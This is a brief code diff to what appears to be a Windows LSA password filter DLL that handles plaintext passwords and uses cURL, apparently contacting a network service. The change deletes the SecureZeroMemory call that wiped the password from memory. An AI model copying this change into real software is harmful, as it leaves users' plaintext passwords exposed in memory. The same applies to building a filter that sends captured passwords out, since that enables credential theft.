@@ -126,7 +126,7 @@ extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRIN
 		}
 		curl_easy_cleanup(curl); // Clean-up for cURL
 	}
-	SecureZeroMemory(password, sizeof(password)); // Clear the password from memory
+	
 	return returnValue; // Return the Boolean value to LSA
 
 }
